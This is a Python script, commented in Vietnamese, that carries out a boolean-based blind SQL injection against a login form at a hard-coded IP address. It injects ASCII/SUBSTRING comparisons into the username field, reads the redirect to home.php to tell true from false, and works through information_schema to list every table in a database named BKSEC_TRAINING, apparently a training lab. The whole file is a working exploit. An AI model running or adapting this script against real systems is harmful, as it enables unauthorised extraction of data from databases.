import requests
import string
import sys
import urllib3

# Tắt cảnh báo bảo mật khi traffic đi qua proxy của Burp Suite
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_URL = "http://103.77.175.40:8021/login-check.php" 

# Cấu hình chuyển hướng traffic sang Burp Suite
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# Tập hợp các ký tự để brute-force
chars = string.ascii_letters + string.digits + "{}_-@!$*"

def exploit(query):
    extracted_string = ""
    print(f"[*] Đang thực thi: {query}")
    
    for i in range(1, 100):
        char_found = False
        for c in chars:
            payload = f"admin' AND ASCII(SUBSTRING(({query}), {i}, 1)) = {ord(c)}-- -"
            data = {
                "uname": payload, 
                "password": "123"
            }
            try:
                r = requests.post(
                    TARGET_URL, 
                    data=data, 
                    allow_redirects=False, 
                    proxies=proxies, 
                    verify=False
                )
                
                if "home.php" in r.headers.get("Location", ""):
                    extracted_string += c
                    sys.stdout.write(f"\r[+] Đang tải: {extracted_string}")
                    sys.stdout.flush()
                    char_found = True
                    break
                    
            except requests.exceptions.RequestException as e:
                print(f"\n[!] Lỗi kết nối: {e}")
                sys.exit(1)
                
        if not char_found:
            break
            
    return extracted_string

if __name__ == "__main__":
    print("--- BẮT ĐẦU QUÉT DATABASE: BKSEC_TRAINING ---")
    print("\n[!] TÌM TẤT CẢ CÁC BẢNG...")
    
    offset = 0
    danh_sach_bang = []
    
    while True:
        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='BKSEC_TRAINING' LIMIT {offset},1"
        table_name = exploit(query)
        
        print()
        
        if table_name == "":
            print(f"[v] Hoàn tất! Đã quét hết toàn bộ bảng trong BKSEC_TRAINING.\n")
            break
            
        print(f"=> Tìm thấy bảng thứ {offset + 1}: {table_name}\n")
        danh_sach_bang.append(table_name)
        offset += 1
        
    print("--- TỔNG KẾT DANH SÁCH BẢNG ---")
    for b in danh_sach_bang:
        print(f"- {b}")